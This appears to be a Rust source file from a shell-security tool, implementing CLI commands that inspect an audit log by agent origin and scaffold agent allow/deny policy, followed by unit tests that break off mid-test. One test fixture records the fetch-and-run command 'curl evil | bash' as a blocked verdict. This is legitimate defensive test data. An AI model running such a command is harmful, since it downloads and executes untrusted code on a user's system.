//! `tirith agent sessions / explain / policy init / allow` — agent governance
//! observability surface.
//!
//! This is the chunk-2 CLI surface for Milestone 4 item 8 (Agent Governance).
//! Chunk 1 added the [`AgentOrigin`] type and threaded it through every verdict
//! and audit entry; chunk 2 makes that recorded signal **inspectable** and
//! adds the policy schema chunk 3 will gate on.
//!
//! Nothing in this module enforces policy. `tirith agent allow` validates a
//! matcher and prints the YAML snippet the operator should paste — it
//! intentionally does NOT mutate `.tirith/policy.yaml`, because the engine
//! does not consume `agent_rules` yet. Silently appending would suggest a
//! behavior that does not exist; chunk 3 lands the wiring.
//!
//! Like every other observability surface, every command is a **local file
//! operation**: it touches no network and is off the tier-1/2/3 detection
//! hot path.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use tirith_core::agent_origin::AgentOrigin;
use tirith_core::audit_aggregator;
use tirith_core::policy::{self, AgentMatcher, AgentOriginKind};

// ===========================================================================
// shared helpers
// ===========================================================================

/// Resolve the audit log path. Mirrors the default in
/// `audit::default_log_path` (which is private in tirith-core) so the CLI
/// can be driven against a temp file by tests without exporting that helper.
fn resolve_log_path(override_path: Option<&str>) -> Option<PathBuf> {
    if let Some(p) = override_path {
        if p.trim().is_empty() {
            return None;
        }
        return Some(PathBuf::from(p));
    }
    policy::data_dir().map(|d| d.join("log.jsonl"))
}

/// Best-effort label for an [`AgentOrigin`] — a single line, ASCII-safe,
/// debug-escaped at every caller-claimed string so a hostile name cannot
/// inject control sequences into the operator's terminal.
///
/// Mirrors the convention `mcp.rs::escape_name` already applies: print
/// caller-claimed bytes through `{:?}` so ANSI escapes / newlines / control
/// bytes become `\u{1b}` / `\n` etc. rather than reaching the terminal raw.
fn label_origin(origin: &AgentOrigin) -> String {
    match origin {
        AgentOrigin::Human { interactive } => {
            if *interactive {
                "human (interactive)".to_string()
            } else {
                "human (non-interactive)".to_string()
            }
        }
        AgentOrigin::Agent { tool, version } => match version {
            Some(v) => format!("agent ({:?} {:?})", tool, v),
            None => format!("agent ({:?})", tool),
        },
        AgentOrigin::Mcp {
            client_name,
            client_version,
        } => match client_version {
            Some(v) => format!("mcp ({:?} {:?})", client_name, v),
            None => format!("mcp ({:?})", client_name),
        },
        AgentOrigin::Gateway => "gateway".to_string(),
        AgentOrigin::Ci { provider } => match provider {
            Some(p) => format!("ci ({:?})", p),
            None => "ci (generic)".to_string(),
        },
        AgentOrigin::Ide { name } => format!("ide ({:?})", name),
    }
}

/// A stable group key — `kind` plus optional caller-claimed payload —
/// usable as a `BTreeMap` key for deterministic ordering. Two origins
/// with the same kind and payload (but different versions) group
/// together; version is observability detail, not group identity.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
struct OriginGroupKey {
    kind: String,
    payload: Option<String>,
    // Discriminate interactive-vs-not for `human` — operators want to see them split.
    interactive_flag: Option<bool>,
}

impl OriginGroupKey {
    fn from_origin(origin: Option<&AgentOrigin>) -> Self {
        match origin {
            None => Self {
                kind: "unknown".to_string(),
                payload: None,
                interactive_flag: None,
            },
            Some(AgentOrigin::Human { interactive }) => Self {
                kind: "human".to_string(),
                payload: None,
                interactive_flag: Some(*interactive),
            },
            Some(AgentOrigin::Agent { tool, .. }) => Self {
                kind: "agent".to_string(),
                payload: Some(tool.clone()),
                interactive_flag: None,
            },
            Some(AgentOrigin::Mcp { client_name, .. }) => Self {
                kind: "mcp".to_string(),
                payload: Some(client_name.clone()),
                interactive_flag: None,
            },
            Some(AgentOrigin::Gateway) => Self {
                kind: "gateway".to_string(),
                payload: None,
                interactive_flag: None,
            },
            Some(AgentOrigin::Ci { provider }) => Self {
                kind: "ci".to_string(),
                payload: provider.clone(),
                interactive_flag: None,
            },
            Some(AgentOrigin::Ide { name }) => Self {
                kind: "ide".to_string(),
                payload: Some(name.clone()),
                interactive_flag: None,
            },
        }
    }

    /// Human label for the group — same convention as [`label_origin`].
    fn label(&self) -> String {
        match (
            self.kind.as_str(),
            self.payload.as_deref(),
            self.interactive_flag,
        ) {
            ("unknown", _, _) => "unknown".to_string(),
            ("human", _, Some(true)) => "human (interactive)".to_string(),
            ("human", _, Some(false)) => "human (non-interactive)".to_string(),
            ("human", _, None) => "human".to_string(),
            ("gateway", _, _) => "gateway".to_string(),
            ("ci", None, _) => "ci (generic)".to_string(),
            ("ci", Some(p), _) => format!("ci ({:?})", p),
            (kind, Some(p), _) => format!("{kind} ({:?})", p),
            (kind, None, _) => kind.to_string(),
        }
    }
}

// ===========================================================================
// `tirith agent sessions`
// ===========================================================================

#[derive(Debug, Clone, serde::Serialize)]
struct SessionGroup {
    /// Stable kind tag — `"human"`, `"agent"`, `"mcp"`, `"gateway"`, `"ci"`,
    /// `"ide"`, or `"unknown"`. Matches [`AgentOrigin::kind`] plus the
    /// explicit `"unknown"` bucket for unattributed entries.
    kind: String,
    /// Caller-claimed payload (tool / client_name / provider / ide name).
    /// `None` for `human`, `gateway`, `unknown`, or a generic CI entry.
    #[serde(skip_serializing_if = "Option::is_none")]
    payload: Option<String>,
    /// Best-effort interactivity flag for `human`. `None` for every other kind.
    #[serde(skip_serializing_if = "Option::is_none")]
    interactive: Option<bool>,
    count: usize,
    /// Last-seen ISO 8601 timestamp.
    last_seen: String,
    /// Per-action histogram — only `Allow` / `Warn` / `Block` are guaranteed
    /// keys; other engine-emitted action strings (e.g. `WarnAck`) flow
    /// through verbatim under their own key.
    actions: BTreeMap<String, usize>,
}

pub fn sessions(log_override: Option<&str>, json: bool) -> i32 {
    let Some(log_path) = resolve_log_path(log_override) else {
        report_error(
            json,
            "tirith agent sessions",
            "no audit log path could be resolved",
        );
        return 1;
    };

    // A missing audit log is not an error — report it plainly with zero groups.
    if !log_path.exists() {
        if json {
            if !write_sessions_json(&log_path, &[]) {
                return 1;
            }
        } else {
            eprintln!(
                "tirith agent sessions: no audit log at {} (zero sessions).",
                log_path.display()
            );
        }
        return 0;
    }

    let read = match audit_aggregator::read_log(&log_path) {
        Ok(r) => r,
        Err(e) => {
            report_error(
                json,
                "tirith agent sessions",
                &format!("could not read {}: {e}", log_path.display()),
            );
            return 1;
        }
    };

    // Group only `verdict` entries — hook_telemetry / trust_change are not
    // verdicts and carry `agent_origin = None` by design (chunk 1). Pulling
    // them in would conflate categories.
    let mut groups: BTreeMap<OriginGroupKey, SessionGroup> = BTreeMap::new();
    for record in read
        .records
        .iter()
        .filter(|r| r.entry_type.is_empty() || r.entry_type == "verdict")
    {
        let key = OriginGroupKey::from_origin(record.agent_origin.as_ref());
        let entry = groups.entry(key.clone()).or_insert_with(|| SessionGroup {
            kind: key.kind.clone(),
            payload: key.payload.clone(),
            interactive: key.interactive_flag,
            count: 0,
            last_seen: String::new(),
            actions: BTreeMap::new(),
        });
        entry.count += 1;
        *entry.actions.entry(record.action.clone()).or_insert(0) += 1;
        // Last-seen is the maximum timestamp by lexicographic comparison
        // — RFC 3339 timestamps sort correctly under that ordering (within
        // the same time zone offset), and our writer always emits UTC.
        if record.timestamp > entry.last_seen {
            entry.last_seen.clone_from(&record.timestamp);
        }
    }

    let groups_sorted: Vec<SessionGroup> = groups.into_values().collect();

    if json {
        if !write_sessions_json(&log_path, &groups_sorted) {
            return 1;
        }
    } else {
        print_sessions_human(&log_path, &groups_sorted, read.skipped_lines);
    }
    0
}

fn write_sessions_json(log_path: &Path, groups: &[SessionGroup]) -> bool {
    #[derive(serde::Serialize)]
    struct Out<'a> {
        schema_version: u32,
        log_path: String,
        group_count: usize,
        total_entries: usize,
        groups: &'a [SessionGroup],
    }
    let total: usize = groups.iter().map(|g| g.count).sum();
    let out = Out {
        schema_version: 1,
        log_path: log_path.display().to_string(),
        group_count: groups.len(),
        total_entries: total,
        groups,
    };
    super::write_json_stdout(&out, "tirith agent sessions: failed to write JSON output")
}

fn print_sessions_human(log_path: &Path, groups: &[SessionGroup], skipped: usize) {
    if groups.is_empty() {
        eprintln!(
            "tirith agent sessions: no verdict entries in {} yet.",
            log_path.display()
        );
        if skipped > 0 {
            eprintln!("  ({skipped} malformed audit line(s) were skipped during read.)");
        }
        return;
    }

    let total: usize = groups.iter().map(|g| g.count).sum();
    eprintln!(
        "tirith agent sessions: {} verdict(s) across {} origin group(s) in {}.",
        total,
        groups.len(),
        log_path.display(),
    );
    eprintln!();
    for g in groups {
        let key = OriginGroupKey {
            kind: g.kind.clone(),
            payload: g.payload.clone(),
            interactive_flag: g.interactive,
        };
        let allow = g.actions.get("Allow").copied().unwrap_or(0);
        let warn = g.actions.get("Warn").copied().unwrap_or(0)
            + g.actions.get("WarnAck").copied().unwrap_or(0);
        let block = g.actions.get("Block").copied().unwrap_or(0);
        let last = if g.last_seen.is_empty() {
            "-".to_string()
        } else {
            g.last_seen.clone()
        };
        eprintln!(
            "  {label:<40}  count={count}  allow={allow}  warn={warn}  block={block}  last={last}",
            label = key.label(),
            count = g.count,
        );
    }
    if skipped > 0 {
        eprintln!();
        eprintln!("  ({skipped} malformed audit line(s) were skipped during read.)");
    }
}

// ===========================================================================
// `tirith agent explain`
// ===========================================================================

#[derive(Debug, Clone, serde::Serialize)]
struct ExplainMatch {
    timestamp: String,
    session_id: String,
    action: String,
    rule_ids: Vec<String>,
    command_redacted: String,
    bypass_requested: bool,
    bypass_honored: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    agent_origin: Option<AgentOrigin>,
    #[serde(skip_serializing_if = "Option::is_none")]
    policy_path: Option<String>,
}

/// Cap on the number of matching entries surfaced; chosen to keep `tirith
/// agent explain` output readable on a terminal while still being useful
/// for a "show me what this caller has been doing" query.
const EXPLAIN_MAX_MATCHES: usize = 20;

pub fn explain(query: &str, log_override: Option<&str>, json: bool) -> i32 {
    let query = query.trim();
    if query.is_empty() {
        report_error(
            json,
            "tirith agent explain",
            "session id or command query is empty",
        );
        return 1;
    }

    let Some(log_path) = resolve_log_path(log_override) else {
        report_error(
            json,
            "tirith agent explain",
            "no audit log path could be resolved",
        );
        return 1;
    };

    if !log_path.exists() {
        report_error(
            json,
            "tirith agent explain",
            &format!(
                "no audit log at {} (no entries to explain)",
                log_path.display()
            ),
        );
        return 1;
    }

    let read = match audit_aggregator::read_log(&log_path) {
        Ok(r) => r,
        Err(e) => {
            report_error(
                json,
                "tirith agent explain",
                &format!("could not read {}: {e}", log_path.display()),
            );
            return 1;
        }
    };

    let query_lower = query.to_ascii_lowercase();
    let mut matches: Vec<ExplainMatch> = read
        .records
        .into_iter()
        .filter(|r| r.entry_type.is_empty() || r.entry_type == "verdict")
        .filter(|r| {
            // Exact session-id match wins, then case-insensitive substring on
            // the redacted command, then a substring on the rendered origin
            // label so an operator can search for "claude-code" etc.
            if r.session_id == query {
                return true;
            }
            if r.command_redacted
                .to_ascii_lowercase()
                .contains(&query_lower)
            {
                return true;
            }
            if let Some(origin) = r.agent_origin.as_ref() {
                if label_origin(origin)
                    .to_ascii_lowercase()
                    .contains(&query_lower)
                {
                    return true;
                }
            }
            false
        })
        .map(|r| ExplainMatch {
            timestamp: r.timestamp,
            session_id: r.session_id,
            action: r.action,
            rule_ids: r.rule_ids,
            command_redacted: r.command_redacted,
            bypass_requested: r.bypass_requested,
            bypass_honored: r.bypass_honored,
            agent_origin: r.agent_origin,
            policy_path: r.policy_path,
        })
        .collect();

    // Newest-first ordering keeps the most actionable entries on top.
    matches.sort_by(|a, b| b.timestamp.cmp(&a.timestamp));
    let truncated = matches.len() > EXPLAIN_MAX_MATCHES;
    if truncated {
        matches.truncate(EXPLAIN_MAX_MATCHES);
    }

    if matches.is_empty() {
        report_error(
            json,
            "tirith agent explain",
            &format!("no matching audit entries for {:?}", query),
        );
        return 1;
    }

    if json {
        if !write_explain_json(&log_path, query, &matches, truncated) {
            return 1;
        }
    } else {
        print_explain_human(&log_path, query, &matches, truncated);
    }
    0
}

fn write_explain_json(
    log_path: &Path,
    query: &str,
    matches: &[ExplainMatch],
    truncated: bool,
) -> bool {
    #[derive(serde::Serialize)]
    struct Out<'a> {
        schema_version: u32,
        log_path: String,
        query: &'a str,
        match_count: usize,
        truncated: bool,
        matches: &'a [ExplainMatch],
    }
    let out = Out {
        schema_version: 1,
        log_path: log_path.display().to_string(),
        query,
        match_count: matches.len(),
        truncated,
        matches,
    };
    super::write_json_stdout(&out, "tirith agent explain: failed to write JSON output")
}

fn print_explain_human(log_path: &Path, query: &str, matches: &[ExplainMatch], truncated: bool) {
    eprintln!(
        "tirith agent explain: {} match(es) for {:?} in {}.",
        matches.len(),
        query,
        log_path.display(),
    );
    if truncated {
        eprintln!("  (output truncated to the most recent {EXPLAIN_MAX_MATCHES} entries.)");
    }
    eprintln!();
    for m in matches {
        let origin = m
            .agent_origin
            .as_ref()
            .map(label_origin)
            .unwrap_or_else(|| "unknown".to_string());
        let rules = if m.rule_ids.is_empty() {
            "-".to_string()
        } else {
            m.rule_ids.join(",")
        };
        // Command is already DLP-redacted by the audit writer; debug-print
        // it so any control bytes that survived redaction are escaped
        // (defensive — the redact path strips them, but printing through
        // `{:?}` makes the contract explicit at this print site).
        eprintln!(
            "  {ts}  session={sid}  origin={origin}  action={action}  rules={rules}",
            ts = m.timestamp,
            sid = m.session_id,
            action = m.action,
        );
        eprintln!("      command: {:?}", m.command_redacted);
        if m.bypass_requested {
            eprintln!(
                "      bypass: requested={}  honored={}",
                m.bypass_requested, m.bypass_honored
            );
        }
        if let Some(p) = m.policy_path.as_deref() {
            eprintln!("      policy: {p}");
        }
        eprintln!();
    }
}

// ===========================================================================
// `tirith agent policy init`
// ===========================================================================

#[derive(Debug, Clone, serde::Serialize)]
struct AgentPolicyScaffold {
    /// `true` when the audit log was readable. A missing log yields a
    /// header-only scaffold and `audit_present: false`.
    audit_present: bool,
    /// The path the log was loaded from.
    log_path: String,
    /// Observed origin groups, sorted (kind, payload).
    origins: Vec<ObservedOrigin>,
}

#[derive(Debug, Clone, serde::Serialize)]
struct ObservedOrigin {
    kind: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    payload: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    interactive: Option<bool>,
    count: usize,
}

pub fn policy_init(log_override: Option<&str>, force: bool, json: bool) -> i32 {
    let repo_root = match find_repo_root_or_cwd() {
        Ok(r) => r,
        Err(e) => {
            report_error(json, "tirith agent policy init", &e);
            return 1;
        }
    };
    policy_init_for_root(&repo_root, log_override, force, json)
}

/// `policy init` against an explicit repo root. Split out so tests can drive
/// the command against a tempdir without mutating process-wide env vars.
pub(crate) fn policy_init_for_root(
    repo_root: &Path,
    log_override: Option<&str>,
    force: bool,
    json: bool,
) -> i32 {
    let tirith_dir = repo_root.join(".tirith");
    let example_path = tirith_dir.join("agent-policy.yaml.example");

    if example_path.exists() && !force {
        report_error(
            json,
            "tirith agent policy init",
            &format!(
                "{} already exists (use --force to overwrite)",
                example_path.display()
            ),
        );
        return 1;
    }

    // Build the scaffold from the audit log (when available).
    let log_path = resolve_log_path(log_override);
    let (audit_present, observed_log_path, origins) = match log_path.as_deref() {
        None => (false, "<unset>".to_string(), Vec::new()),
        Some(p) if !p.exists() => (false, p.display().to_string(), Vec::new()),
        Some(p) => match audit_aggregator::read_log(p) {
            Ok(read) => {
                let mut groups: BTreeMap<OriginGroupKey, ObservedOrigin> = BTreeMap::new();
                for record in read
                    .records
                    .iter()
                    .filter(|r| r.entry_type.is_empty() || r.entry_type == "verdict")
                    .filter(|r| r.agent_origin.is_some())
                {
                    let key = OriginGroupKey::from_origin(record.agent_origin.as_ref());
                    let entry = groups.entry(key.clone()).or_insert(ObservedOrigin {
                        kind: key.kind.clone(),
                        payload: key.payload.clone(),
                        interactive: key.interactive_flag,
                        count: 0,
                    });
                    entry.count += 1;
                }
                (
                    true,
                    p.display().to_string(),
                    groups.into_values().collect(),
                )
            }
            Err(e) => {
                report_error(
                    json,
                    "tirith agent policy init",
                    &format!("could not read {}: {e}", p.display()),
                );
                return 1;
            }
        },
    };

    let scaffold = AgentPolicyScaffold {
        audit_present,
        log_path: observed_log_path,
        origins,
    };

    if let Err(e) = std::fs::create_dir_all(&tirith_dir) {
        report_error(
            json,
            "tirith agent policy init",
            &format!("failed to create {}: {e}", tirith_dir.display()),
        );
        return 1;
    }

    let yaml_body = render_agent_policy_scaffold_yaml(&scaffold);
    if let Err(e) = std::fs::write(&example_path, &yaml_body) {
        report_error(
            json,
            "tirith agent policy init",
            &format!("failed to write {}: {e}", example_path.display()),
        );
        return 1;
    }

    if json {
        if !write_policy_init_json(repo_root, &example_path, &scaffold) {
            return 1;
        }
    } else {
        print_policy_init_human(&example_path, &scaffold);
    }
    0
}

/// Render the scaffold to YAML. Every entry is commented out by design —
/// mirrors `tirith mcp policy init`. Two runs against the same audit log
/// produce a byte-identical scaffold (origins are sorted, header is fixed,
/// no embedded timestamps).
fn render_agent_policy_scaffold_yaml(scaffold: &AgentPolicyScaffold) -> String {
    let mut s = String::new();
    s.push_str("# Tirith agent governance policy scaffold (example)\n");
    s.push_str("# Generated by `tirith agent policy init` from the local audit log.\n");
    s.push_str("#\n");
    s.push_str("# This is an EXAMPLE — every entry below is commented out. Copy the\n");
    s.push_str("# entries you want into `.tirith/policy.yaml` (merging under any\n");
    s.push_str("# existing `agent_rules:` block) and uncomment them. Re-run\n");
    s.push_str("# `tirith agent policy init --force` to regenerate from the latest\n");
    s.push_str("# audit log.\n");
    s.push_str("#\n");
    s.push_str("# IMPORTANT: agent_rules is OBSERVATION-ONLY in this release\n");
    s.push_str("# (M4 item 8 chunk 2). Loading a policy with agent_rules populated\n");
    s.push_str("# changes no verdict's outcome today; chunk 3 will wire the policy\n");
    s.push_str("# into verdict gating. Until then, `tirith agent allow` / this\n");
    s.push_str("# scaffold are useful for observability, not enforcement.\n");
    s.push_str("#\n");
    s.push_str("# Trust model: every signal feeding AgentOrigin is OPERATOR-TRUST,\n");
    s.push_str("# never adversary-resistant — TIRITH_INTEGRATION, MCP clientInfo,\n");
    s.push_str("# CI env vars, is_terminal() are all settable by any process running\n");
    s.push_str("# as the user. See docs/agent-governance-design.md.\n");
    s.push('\n');

    if !scaffold.audit_present {
        s.push_str("# No audit log was found at the configured path — run a few\n");
        s.push_str("# `tirith check` / `tirith paste` commands to populate it, then\n");
        s.push_str("# re-run this command. Until then, the scaffold below is the\n");
        s.push_str("# template form of an agent_rules block.\n");
        s.push('\n');
    }

    if scaffold.origins.is_empty() {
        s.push_str("# The audit log recorded no agent origins yet, so there is nothing\n");
        s.push_str("# to scaffold from. The structure is shown below as a template:\n");
        s.push_str("#\n");
        s.push_str("# agent_rules:\n");
        s.push_str("#   allow:\n");
        s.push_str("#     - kind: agent\n");
        s.push_str("#       tool: claude-code\n");
        s.push_str("#     - kind: mcp\n");
        s.push_str("#       tool: Cursor\n");
        s.push_str("#   deny:\n");
        s.push_str("#     - kind: agent\n");
        s.push_str("#       tool: untrusted-tool\n");
        return s;
    }

    s.push_str("agent_rules:\n");
    s.push_str("  # Observed origins from the audit log are listed below as `allow`\n");
    s.push_str("  # candidates. Review each and uncomment only the ones you intend\n");
    s.push_str("  # to declare — importing a scaffold must NEVER silently widen trust.\n");
    s.push_str("  # allow:\n");
    for o in &scaffold.origins {
        match (o.kind.as_str(), o.payload.as_deref()) {
            ("human", _) => {
                // Human / gateway entries have no caller-claimed payload.
                let inter = o
                    .interactive
                    .map(|b| if b { "interactive" } else { "non-interactive" })
                    .unwrap_or("");
                s.push_str(&format!(
                    "  #   - kind: human    # {} entries; observed {inter}\n",
                    o.count,
                ));
            }
            ("gateway", _) => {
                s.push_str(&format!("  #   - kind: gateway    # {} entries\n", o.count,));
            }
            ("ci", None) => {
                s.push_str(&format!(
                    "  #   - kind: ci    # {} entries (generic CI)\n",
                    o.count,
                ));
            }
            (kind, Some(payload)) => {
                s.push_str(&format!(
                    "  #   - kind: {kind}\n  #     tool: {}    # {} entries\n",
                    yaml_safe_scalar(payload),
                    o.count,
                ));
            }
            (kind, None) => {
                s.push_str(&format!("  #   - kind: {kind}    # {} entries\n", o.count,));
            }
        }
    }
    s.push('\n');
    s.push_str("  # Use `deny` for the inverse — origins you want to block. A deny\n");
    s.push_str("  # entry beats any matching allow entry (mirrors blocklist over\n");
    s.push_str("  # allowlist elsewhere in this policy). Example:\n");
    s.push_str("  # deny:\n");
    s.push_str("  #   - kind: agent\n");
    s.push_str("  #     tool: untrusted-tool\n");
    s
}

fn print_policy_init_human(example_path: &Path, scaffold: &AgentPolicyScaffold) {
    if !scaffold.audit_present {
        eprintln!(
            "tirith agent policy init: no audit log found at {} — wrote a header-only scaffold.",
            scaffold.log_path
        );
        eprintln!(
            "  Run a few `tirith check` / `tirith paste` commands to populate the log, then re-run this command."
        );
    } else if scaffold.origins.is_empty() {
        eprintln!(
            "tirith agent policy init: audit log at {} recorded no agent origins — wrote a template scaffold.",
            scaffold.log_path
        );
    } else {
        eprintln!(
            "tirith agent policy init: scaffolded {} observed origin group(s) from {}.",
            scaffold.origins.len(),
            scaffold.log_path,
        );
        eprintln!("  Every entry is commented out — uncomment the ones you wish to declare.");
        eprintln!("  REMEMBER: agent_rules is observation-only today (chunk 2); enforcement lands in chunk 3.");
    }
    eprintln!("  wrote {}", example_path.display());
    println!("{}", example_path.display());
}

fn write_policy_init_json(
    repo_root: &Path,
    example_path: &Path,
    scaffold: &AgentPolicyScaffold,
) -> bool {
    #[derive(serde::Serialize)]
    struct Out<'a> {
        schema_version: u32,
        repo_root: String,
        example_path: String,
        scaffold: &'a AgentPolicyScaffold,
    }
    let out = Out {
        schema_version: 1,
        repo_root: repo_root.display().to_string(),
        example_path: example_path.display().to_string(),
        scaffold,
    };
    super::write_json_stdout(
        &out,
        "tirith agent policy init: failed to write JSON output",
    )
}

// ===========================================================================
// `tirith agent allow`
// ===========================================================================

pub fn allow(kind_str: &str, tool: Option<&str>, json: bool) -> i32 {
    let Some(kind) = AgentOriginKind::parse(kind_str) else {
        report_error(
            json,
            "tirith agent allow",
            &format!(
                "unknown kind {:?} (valid: human, agent, mcp, gateway, ci, ide)",
                kind_str
            ),
        );
        return 1;
    };

    // Validation: a tool filter on a payloadless kind matches nothing.
    if tool.is_some() && matches!(kind, AgentOriginKind::Human | AgentOriginKind::Gateway) {
        report_error(
            json,
            "tirith agent allow",
            &format!(
                "kind: {} carries no caller-claimed payload — a --tool filter would match nothing",
                kind.as_str()
            ),
        );
        return 1;
    }

    // Empty tool string is the same matches-nothing trap — reject it.
    if matches!(tool, Some("")) {
        report_error(
            json,
            "tirith agent allow",
            "--tool must not be empty (an empty payload matches nothing)",
        );
        return 1;
    }

    let matcher = AgentMatcher {
        kind,
        tool: tool.map(|s| s.to_string()),
    };

    let snippet = render_allow_snippet(&matcher);

    if json {
        #[derive(serde::Serialize)]
        struct Out<'a> {
            schema_version: u32,
            matcher: &'a AgentMatcher,
            snippet: &'a str,
            /// Honest reminder: this command does NOT mutate any policy file.
            applied: bool,
        }
        let out = Out {
            schema_version: 1,
            matcher: &matcher,
            snippet: &snippet,
            applied: false,
        };
        if !super::write_json_stdout(&out, "tirith agent allow: failed to write JSON output") {
            return 1;
        }
    } else {
        eprintln!("tirith agent allow: valid matcher — paste the snippet below under `agent_rules.allow:` in your policy.");
        eprintln!("  (NOTE: agent_rules is observation-only today; chunk 3 wires enforcement.)");
        eprintln!();
        // Print snippet to stdout so it can be captured / piped into a file.
        print!("{snippet}");
    }
    0
}

/// Render the matcher as the YAML list-item snippet an operator pastes
/// under `agent_rules.allow`. Always uses two-space indentation under
/// `allow:` so it merges cleanly into a `tirith policy init` template.
fn render_allow_snippet(m: &AgentMatcher) -> String {
    let mut s = String::new();
    s.push_str(&format!("    - kind: {}\n", m.kind.as_str()));
    if let Some(t) = m.tool.as_deref() {
        s.push_str(&format!("      tool: {}\n", yaml_safe_scalar(t)));
    }
    s
}

// ===========================================================================
// helpers — repo root, error reporting, YAML escaping
// ===========================================================================

/// Resolve the repository root the same way `tirith policy init` does:
/// `.git`-boundary walk-up from cwd, falling back to cwd itself when no
/// repo is found.
fn find_repo_root_or_cwd() -> Result<PathBuf, String> {
    let cwd =
        std::env::current_dir().map_err(|e| format!("cannot determine working directory: {e}"))?;
    let cwd_str = cwd.display().to_string();
    Ok(policy::find_repo_root(Some(&cwd_str)).unwrap_or(cwd))
}

/// Render a YAML scalar safely — quote-and-escape when needed. Mirrors the
/// `mcp::yaml_safe_scalar` rules locally so this module is self-contained
/// (the mcp helper is module-private and could be moved to a shared spot
/// later; today, duplicating the safety rules here keeps each command's
/// rendering audit-able in one place).
const YAML_NEEDS_QUOTING_BYTES: &[u8] = b":#-?,[]{}&*!|>'\"%@` \t";

fn yaml_safe_scalar(s: &str) -> String {
    if s.is_empty() {
        return "\"\"".to_string();
    }
    let needs_quoting = s
        .bytes()
        .any(|b| YAML_NEEDS_QUOTING_BYTES.contains(&b) || b < 0x20 || b == 0x7f);
    if !needs_quoting {
        return s.to_string();
    }
    serde_json::to_string(s)
        .map(|json| json.replace('\u{7f}', "\\u007F"))
        .unwrap_or_else(|_| format!("\"{}\"", s.escape_debug()))
}

fn report_error(json: bool, command: &str, message: &str) {
    if json {
        #[derive(serde::Serialize)]
        struct Err<'a> {
            schema_version: u32,
            error: &'a str,
        }
        let ctx = format!("{command}: failed to write JSON output");
        let _ = super::write_json_stdout(
            &Err {
                schema_version: 1,
                error: message,
            },
            &ctx,
        );
    } else {
        eprintln!("{command}: {message}");
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::tempdir;
    use tirith_core::agent_origin::AgentOrigin;

    /// Write a verdict-shape audit-log line directly to `log_path`. We craft
    /// the JSONL by hand rather than calling `log_verdict` so the test
    /// (a) doesn't need to touch process env vars (no XDG/APPDATA mutation),
    /// (b) doesn't need the lock on the engine, and (c) controls the
    /// timestamp ordering deterministically.
    ///
    /// The line matches the `AuditEntry` shape produced by `audit::log_verdict`.
    fn plant_audit_line(
        log_path: &Path,
        timestamp: &str,
        session_id: &str,
        action: &str,
        rule_ids: &[&str],
        command: &str,
        origin: Option<&AgentOrigin>,
    ) {
        use std::io::Write;
        if let Some(parent) = log_path.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        let mut line = serde_json::json!({
            "timestamp": timestamp,
            "session_id": session_id,
            "action": action,
            "rule_ids": rule_ids,
            "command_redacted": command,
            "bypass_requested": false,
            "bypass_honored": false,
            "interactive": false,
            "tier_reached": 3,
            "entry_type": "verdict",
        });
        if let Some(o) = origin {
            line["agent_origin"] = serde_json::to_value(o).unwrap();
        }
        let mut f = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(log_path)
            .unwrap();
        writeln!(f, "{line}").unwrap();
    }

    /// Plant a synthetic hook-telemetry line. Used by the "sessions only
    /// counts verdicts" test to confirm filtering.
    fn plant_hook_telemetry_line(log_path: &Path, timestamp: &str, integration: &str) {
        use std::io::Write;
        if let Some(parent) = log_path.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        let line = serde_json::json!({
            "timestamp": timestamp,
            "session_id": "hk",
            "action": "hook",
            "rule_ids": [],
            "command_redacted": "",
            "bypass_requested": false,
            "bypass_honored": false,
            "interactive": false,
            "tier_reached": 0,
            "entry_type": "hook_telemetry",
            "event": "check_ok",
            "integration": integration,
            "hook_type": "pre_tool_use",
        });
        let mut f = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(log_path)
            .unwrap();
        writeln!(f, "{line}").unwrap();
    }

    // -----------------------------------------------------------------------
    // sessions
    // -----------------------------------------------------------------------

    #[test]
    fn sessions_handles_missing_log_path() {
        let temp = tempdir().unwrap();
        let log = temp.path().join("does-not-exist.jsonl");
        // Missing log is NOT an error — exits 0 with zero groups.
        let code = sessions(Some(log.to_str().unwrap()), false);
        assert_eq!(code, 0);
        let code = sessions(Some(log.to_str().unwrap()), true);
        assert_eq!(code, 0);
    }

    #[test]
    fn sessions_groups_by_origin_kind_and_payload() {
        let temp = tempdir().unwrap();
        let log = temp.path().join("audit.jsonl");
        let claude = AgentOrigin::agent("claude-code", None).unwrap();
        let cursor = AgentOrigin::agent("cursor", None).unwrap();
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "s1",
            "Allow",
            &[],
            "echo hi",
            Some(&claude),
        );
        plant_audit_line(
            &log,
            "2026-05-22T10:01:00+00:00",
            "s2",
            "Allow",
            &[],
            "echo hi2",
            Some(&claude),
        );
        plant_audit_line(
            &log,
            "2026-05-22T10:02:00+00:00",
            "s3",
            "Block",
            &["curl_pipe_shell"],
            "curl evil | bash",
            Some(&cursor),
        );
        plant_audit_line(
            &log,
            "2026-05-22T10:03:00+00:00",
            "s4",
            "Allow",
            &[],
            "ls",
            None,
        );

        let code = sessions(Some(log.to_str().unwrap()), false);
        assert_eq!(code, 0);
    }

    #[test]
    fn sessions_filters_to_verdict_entries_only() {
        let temp = tempdir().unwrap();
        let log = temp.path().join("audit.jsonl");
        let claude = AgentOrigin::agent("claude-code", None).unwrap();
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "s1",
            "Allow",
            &[],
            "echo hi",
            Some(&claude),
        );
        plant_hook_telemetry_line(&log, "2026-05-22T10:01:00+00:00", "claude-code");

        let code = sessions(Some(log.to_str().unwrap()), false);
        assert_eq!(code, 0, "hook_telemetry rows must not break the read");
    }

    #[test]
    fn sessions_unattributed_entries_land_in_unknown_bucket() {
        let temp = tempdir().unwrap();
        let log = temp.path().join("audit.jsonl");
        plant_audit_line(
            &log,
            "2026-05-22T10:00:00+00:00",
            "s1",
            "Allow",
            &[],
            "a",
            None,
        );
        plant_audit_line(
            &log,
            "2026-05-22T10:01:00+00:00",
            "s2",
            "Allow",
            &[],
            "b",
            None,
        );
        plant_audit_line(
            &log,
            "2026-05-22T10:02:00+00:00",
            "s3",
            "Block",
            &[],
